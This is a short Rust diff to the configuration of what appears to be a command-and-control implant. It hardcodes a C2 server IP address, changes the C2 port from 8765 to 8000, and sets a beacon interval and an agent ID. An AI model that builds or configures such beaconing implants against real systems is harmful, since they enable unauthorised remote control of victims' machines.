@@ -15,7 +15,7 @@ impl Config {
     pub fn from_env() -> Result<Self, Box<dyn std::error::Error>> {
         // All config hardcoded in binary - no .env file needed
         let c2_url = "191.217.250.6".to_string();
-        let c2_port: u16 = 8765;
+        let c2_port: u16 = 8000;
         let beacon_interval: u64 = 10;
         let debug = true;
         let agent_id = uuid::Uuid::new_v4().to_string();
